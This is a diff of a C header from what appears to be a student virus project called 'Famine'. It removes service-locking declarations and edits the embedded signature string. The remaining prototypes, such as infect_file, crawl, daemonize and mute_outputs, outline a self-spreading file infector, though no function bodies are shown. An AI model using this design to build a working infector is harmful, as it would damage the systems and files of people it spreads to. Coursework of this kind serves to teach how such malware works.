@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/03/04 11:29:36 by mbatty            #+#    #+#             */
-/*   Updated: 2026/04/18 15:25:52 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/04/19 11:09:32 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -23,13 +23,7 @@ typedef struct	s_exec_ctx
 	char	**envp;
 }	t_exec_ctx;
 
-typedef struct s_service_ctx
-{
-	int		lock_fd;
-	bool	super_user;
-}	t_service_ctx;
-
-#define SIGNATURE_STR "Famine version 1.0 (c)oded by mbatty-mbatty"
+#define SIGNATURE_STR "\0" "Famine version 1.0 (c)oded by mbatty-mbatty"
 
 typedef struct s_footer
 {
@@ -48,12 +42,8 @@ t_footer	get_footer(const char *path);
 
 int		daemonize();
 int		mute_outputs();
-int		lock_lock(t_service_ctx *ctx, const char *path);
-int		unlock_lock(t_service_ctx *ctx, const char *path);
 
 char	*strjoin(char const *s1, char const *s2);
-
-int		run_service();
 
 int		infect_file(t_exec_ctx *ctx, const char *path);
 int		crawl(t_exec_ctx *ctx);
